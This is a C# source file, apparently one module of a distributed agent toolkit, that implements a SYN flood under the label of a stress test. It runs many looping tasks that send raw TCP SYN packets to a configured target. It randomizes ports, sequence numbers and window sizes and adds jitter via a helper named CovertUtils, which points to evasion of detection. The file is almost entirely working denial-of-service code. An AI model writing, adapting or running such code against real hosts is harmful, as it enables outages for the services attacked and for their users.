using System.Net.Sockets;

namespace LibraNextgen.Agent.Modules.StressTest;

public class SynFlood : IStressMethod
{
    public string Name => "SYN Flood";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var tasks = new List<Task>();
        var threads = Math.Min(config.ThreadsPerAgent / 10, 50);
        for (int i = 0; i < threads; i++)
            tasks.Add(SynLoop(config, rpt, ct));
        await Task.WhenAll(tasks);
    }

    private async Task SynLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp);
                var packet = BuildSyn(config.TargetHost, config.TargetPort);

                try
                {
                    await socket.SendToAsync(new ArraySegment<byte>(packet), SocketFlags.None,
                        new System.Net.IPEndPoint(System.Net.IPAddress.Parse(config.TargetHost), config.TargetPort), ct);
                    rpt.IncrementPackets();
                    rpt.IncrementBytes(packet.Length);
                }
                catch (SocketException) { }

                await Task.Delay(CovertUtils.RandomJitter(1, 0.5), ct);
            }
            catch { }
        }
    }

    private static byte[] BuildSyn(string dstIp, int dstPort)
    {
        var rand = new Random();
        var srcPort = (ushort)CovertUtils.RandomSourcePort();
        var seq = (uint)Random.Shared.NextInt64();
        var win = CovertUtils.RandomTcpWindow();
        var tcpLen = 20 + rand.Next(0, 40);
        var packet = new byte[tcpLen];
        packet[0] = (byte)(srcPort >> 8); packet[1] = (byte)srcPort;
        packet[2] = (byte)(dstPort >> 8); packet[3] = (byte)dstPort;
        packet[4] = (byte)(seq >> 24); packet[5] = (byte)(seq >> 16);
        packet[6] = (byte)(seq >> 8); packet[7] = (byte)seq;
        packet[13] = 0x02; // SYN
        packet[14] = (byte)(win >> 8); packet[15] = (byte)win;
        for (int i = 16; i < tcpLen; i++) packet[i] = (byte)rand.Next(256);
        return packet;
    }
}
